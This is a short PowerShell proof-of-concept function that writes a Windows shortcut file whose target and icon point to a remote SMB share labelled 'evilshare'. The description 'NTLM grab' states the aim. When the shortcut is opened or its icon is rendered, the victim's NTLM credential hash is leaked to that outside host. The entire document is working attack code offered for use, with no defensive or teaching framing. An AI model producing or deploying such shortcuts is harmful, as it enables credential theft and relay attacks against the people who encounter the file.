function Create-SMBHashLeakLnk {
    [CmdletBinding()]
    param (
        [string]$LnkFilePath   = "poc.lnk",
        [string]$SmbSharePath  = "\\192.168.254.43\evilshare\test.exe",
        [string]$Description   = "NTLM grab"
    )

    # Ensure full path for the .lnk
    if (-not [IO.Path]::IsPathRooted($LnkFilePath)) {
        $LnkFilePath = Join-Path -Path (Get-Location) -ChildPath $LnkFilePath
    }

    # Make sure the directory exists
    $dir = [IO.Path]::GetDirectoryName($LnkFilePath)
    if (-not (Test-Path $dir)) {
        New-Item -Path $dir -ItemType Directory -Force | Out-Null
    }

    # Create the shortcut
    $wsh = New-Object -ComObject WScript.Shell
    $sc  = $wsh.CreateShortcut($LnkFilePath)
    $sc.TargetPath   = $SmbSharePath
    $sc.Description  = $Description
    # optional: force an icon so Windows still tries to resolve something
    $sc.IconLocation = $SmbSharePath + ",0"
    $sc.Save()

    Write-Host "Created LNK --> $LnkFilePath"
}
